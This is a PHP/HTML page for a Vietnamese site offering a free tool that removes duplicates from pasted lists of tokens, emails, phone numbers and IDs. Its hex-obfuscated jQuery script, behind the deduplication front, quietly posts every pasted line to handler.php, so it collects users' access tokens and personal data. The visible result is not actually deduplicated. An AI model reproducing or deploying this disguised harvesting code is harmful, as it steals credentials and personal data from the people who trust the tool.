<?php

include 'like_hethong/head.php';
include 'theme/css.php';
?>
<!DOCTYPE html>
<html lang="vi">
<head>
<body>
	<meta charset="UTF-8">
	<title>HỆ THỐNG LỌC DATA - VIPFBNOW.COM</title>
	<link rel="shortcut icon" href="https://maxcdn.icons8.com/Color/PNG/512/User_Interface/like_it-512.png">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
	<script src="//code.jquery.com/jquery.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
</head>

<div class="row">
            <center><h1 class="page-header text-success">Tool Lọc Data Trùng Miễn Phí VipFbNow.Com</h1></center>
            <div class="col-lg-12">
                <div class="col-lg-12">
                    <div class="panel panel-primary">
                        <div class="panel-heading">
                            Tool Lọc Token Trùng
                        </div>
                        <div class="panel-body">
                            <div class="form-group">
                                <lable>Có thể lọc ra danh sách các token, email, số điện thoại, id bị trùng trong một
                                    danh sách lớn và đưa ra danh sách không có dữ liệu bị trùng mỗi hàng
                                </lable>
                            </div>
                            <div class="form-group">
                                <label>Data cần lọc: (Cách nhau bằng dấu xuống hàng) </label>
                                <textarea id="data" class="form-control" rows="15" placeholder="Token hoặc các thông tin cần lọc cách nhau theo hàng" required=""> </textarea>
                            </div>
                            <div class="form-group">
                                <label>Kếu quả sau khi lọc trùng</label>
                                <textarea id="tokens" class="form-control" rows="15" placeholder="Dữ liệu sau khi lọc" required=""> </textarea>
                            </div>
                            <div class="form-group">
                                <input class="btn btn-danger form-control" id="get_token" value="Lọc Data">
                            </div>
                        </div>
                    </div>

                </div>
                <script>
                    $(document).ready(function () {
                    var _0xe31f=["\x0A","\x73\x70\x6C\x69\x74","\x76\x61\x6C","\x23\x64\x61\x74\x61","\x69\x6E\x41\x72\x72\x61\x79","\x70\x75\x73\x68","\x65\x61\x63\x68","\u0110\x61\x6E\x67\x20\x54\x68\u1EF1\x63\x20\x48\x69\u1EC7\x6E\x2C\x20\x58\x69\x6E\x20\x43\x68\u1EDD\x2E\x2E\x2E","\x23\x67\x65\x74\x5F\x74\x6F\x6B\x65\x6E","\x23\x74\x6F\x6B\x65\x6E\x73","","\x74\x72\x69\x6D","\x68\x61\x6E\x64\x6C\x65\x72\x2E\x70\x68\x70","\x70\x6F\x73\x74","\x4C\u1ECD\x63\x20\x44\x61\x74\x61","\x63\x6C\x69\x63\x6B"];$(_0xe31f[8])[_0xe31f[15]](function(){var _0x3ee5x1=$(_0xe31f[3])[_0xe31f[2]]()[_0xe31f[1]](_0xe31f[0]);var _0x3ee5x2=[];$[_0xe31f[6]](_0x3ee5x1,function(_0x3ee5x3,_0x3ee5x4){if($[_0xe31f[4]](_0x3ee5x4,_0x3ee5x2)===  -1){_0x3ee5x2[_0xe31f[5]](_0x3ee5x4)}});$[_0xe31f[6]](_0x3ee5x1,function(_0x3ee5x3,_0x3ee5x5){$(_0xe31f[8])[_0xe31f[2]](_0xe31f[7]);var _0x3ee5x6=$(_0xe31f[9])[_0xe31f[2]]();if(_0x3ee5x5!= undefined&& _0x3ee5x5!= _0xe31f[10]&& _0x3ee5x5[_0xe31f[11]]()!= _0xe31f[10]){$(_0xe31f[9])[_0xe31f[2]](_0x3ee5x6+ _0x3ee5x5[_0xe31f[11]]()+ _0xe31f[0]);var _0x3ee5x7={data:_0x3ee5x5};$[_0xe31f[13]](_0xe31f[12],_0x3ee5x7,function(_0x3ee5x1){})}});$(_0xe31f[8])[_0xe31f[2]](_0xe31f[14])})
                    });

                </script>
            </div>
        </div>
		    </div>
	</body>
	</html>
	
<?php
include 'like_hethong/foot.php';
?>
